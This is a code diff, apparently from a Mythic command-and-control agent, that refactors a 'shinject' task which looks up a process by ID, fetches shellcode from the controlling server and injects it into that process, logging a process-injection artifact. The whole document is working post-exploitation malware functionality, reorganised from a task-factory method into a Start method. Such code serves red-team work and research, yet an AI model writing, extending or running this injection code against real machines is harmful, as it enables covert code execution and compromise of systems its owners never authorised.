@@ -33,57 +33,58 @@ namespace Tasks
         {
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp;
+            ShinjectArguments args = _jsonSerializer.Deserialize<ShinjectArguments>(_data.Parameters);
+            System.Diagnostics.Process proc = null;
+            try
             {
-                TaskResponse resp;
-                ShinjectArguments args = _jsonSerializer.Deserialize<ShinjectArguments>(_data.Parameters);
-                System.Diagnostics.Process proc = null;
-                try
-                {
-                    proc = System.Diagnostics.Process.GetProcessById(args.PID);
-                } catch { }
-                if (proc != null)
-                {
-                    if (_agent.GetFileManager().GetFile(
+                proc = System.Diagnostics.Process.GetProcessById(args.PID);
+            }
+            catch
+            {
+            }
+
+            if (proc != null)
+            {
+                if (_agent.GetFileManager().GetFile(
                         _cancellationToken.Token,
                         _data.ID,
                         args.Shellcode, out byte[] code))
-                    {
-                        var technique = _agent.GetInjectionManager().CreateInstance(code, args.PID);
-                        if (technique.Inject())
-                        {
-                            resp = CreateTaskResponse(
-                                $"Injected code into {proc.ProcessName} ({proc.Id})", true, "completed",
-                                new IMythicMessage[] {
-                                    Artifact.ProcessInject(proc.Id, technique.GetType().Name)
-                                });
-                        }
-                        else
-                        {
-                            resp = CreateTaskResponse(
-                                $"Failed to inject code into {proc.ProcessName} ({proc.Id}): {Marshal.GetLastWin32Error()}",
-                                true,
-                                "error");
-                        }
-                    } else
-                    {
-                        resp = CreateTaskResponse("Failed to fetch file.", true, "error");
-                    }
-                } else
                 {
-                    resp = CreateTaskResponse($"No process with ID {args.PID} running.", true, "error");
+                    var technique = _agent.GetInjectionManager().CreateInstance(code, args.PID);
+                    if (technique.Inject())
+                    {
+                        resp = CreateTaskResponse(
+                            $"Injected code into {proc.ProcessName} ({proc.Id})", true, "completed",
+                            new IMythicMessage[]
+                            {
+                                Artifact.ProcessInject(proc.Id, technique.GetType().Name)
+                            });
+                    }
+                    else
+                    {
+                        resp = CreateTaskResponse(
+                            $"Failed to inject code into {proc.ProcessName} ({proc.Id}): {Marshal.GetLastWin32Error()}",
+                            true,
+                            "error");
+                    }
                 }
-                // Your code here..
-                // Then add response to queue
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                else
+                {
+                    resp = CreateTaskResponse("Failed to fetch file.", true, "error");
+                }
+            }
+            else
+            {
+                resp = CreateTaskResponse($"No process with ID {args.PID} running.", true, "error");
+            }
+
+            // Your code here..
+            // Then add response to queue
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
